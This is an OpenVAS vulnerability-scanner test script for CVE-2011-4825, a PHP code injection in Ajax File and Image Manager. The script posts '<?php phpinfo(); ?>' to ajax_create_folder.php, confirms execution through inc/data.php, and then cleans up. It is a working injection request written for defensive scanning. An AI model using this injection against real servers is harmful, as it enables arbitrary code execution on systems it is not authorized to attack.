###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_afim_50523.nasl 12014 2018-10-22 10:01:47Z mmartin $
#
# Ajax File and Image Manager 'data.php' PHP Code Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103334");
  script_cve_id("CVE-2011-4825");
  script_bugtraq_id(50523);
  script_version("$Revision: 12014 $");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Ajax File and Image Manager 'data.php' PHP Code Injection Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/50523");
  script_xref(name:"URL", value:"http://www.phpletter.com/");

  script_tag(name:"last_modification", value:"$Date: 2018-10-22 12:01:47 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-11-07 07:36:01 +0100 (Mon, 07 Nov 2011)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"summary", value:"Ajax File and Image Manager is prone to a remote PHP code-injection
 vulnerability.");
  script_tag(name:"impact", value:"An attacker can exploit this issue to inject and execute arbitrary PHP
 code in the context of the affected application. This may facilitate a
 compromise of the application and the underlying system. Other attacks
 are also possible.");
  script_tag(name:"affected", value:"Ajax File and Image Manager 1.0 is vulnerable. Other versions may also
 be affected.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

host = http_host_name( port:port );

ex = string("bla=1&blub=2&foo=<?php phpinfo(); ?>");

foreach dir( make_list_unique( "/fm", "/file", "/filemanager", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  filename = string(dir,"/ajaxfilemanager/ajax_create_folder.php");

  req = string("POST ", filename, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Accept-Encoding: identity\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(ex),
               "\r\n\r\n",
               ex);

  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if(result =~ "HTTP/1.. 200") {

    url = string(dir, "/ajaxfilemanager/inc/data.php");
    req = http_get(item:url, port:port);

    result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

    if("<title>phpinfo()" >< result) {

      # clean the data.php on success by sending empty POST...
      ex = string("");

      req = string("POST ", filename, " HTTP/1.1\r\n",
                   "Host: ", host, "\r\n",
                   "Accept-Encoding: identity\r\n",
                   "Content-Type: application/x-www-form-urlencoded\r\n",
                   "Content-Length: ", strlen(ex),
                   "\r\n\r\n",
                   ex);

      result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

      security_message(port:port);
      exit(0);

    }
  }
}

exit(99);
